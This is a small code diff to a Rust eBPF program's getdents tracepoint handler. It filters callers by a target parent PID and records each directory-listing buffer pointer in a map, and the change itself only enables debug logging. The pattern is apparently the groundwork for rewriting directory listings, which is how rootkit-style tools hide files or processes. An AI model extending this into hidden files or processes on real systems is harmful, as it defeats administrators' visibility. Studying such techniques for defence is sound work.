@@ -56,7 +56,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
             bpf_probe_read_kernel::<i32>(
                 (real_parent.unwrap() as usize + offset_of!(task_struct, tgid)) as *const i32,
             )
-                .unwrap()
+            .unwrap()
         };
 
         if ppid != *the_target_ppid {
@@ -64,17 +64,23 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
         }
     }
 
-    // let pid = pid_tgid >> 32;
+    let pid = pid_tgid >> 32;
     // field:unsigned int fd;  offset:16;      size:8; signed:0;
     // field:struct linux_dirent64 * dirent;   offset:24;      size:8; signed:0;
     // field:unsigned int count;       offset:32;      size:8; signed:0;
-    // let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
-    // let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
-    // info!(&ctx, "pid is {}, fd is {}, buff_count is 0x{:x}", pid, fd, buff_count);
+    let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
+    let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
+    info!(
+        &ctx,
+        "pid is {}, fd is {}, buff_count is 0x{:x}", pid, fd, buff_count
+    );
 
     let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
     map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();
-    info!(&ctx, "pid_tgid is {}, dirp is 0x{:x}", pid_tgid ,dirp as u64);
+    info!(
+        &ctx,
+        "pid_tgid is {}, dirp is 0x{:x}", pid_tgid, dirp as u64
+    );
     Ok(0)
 }
 
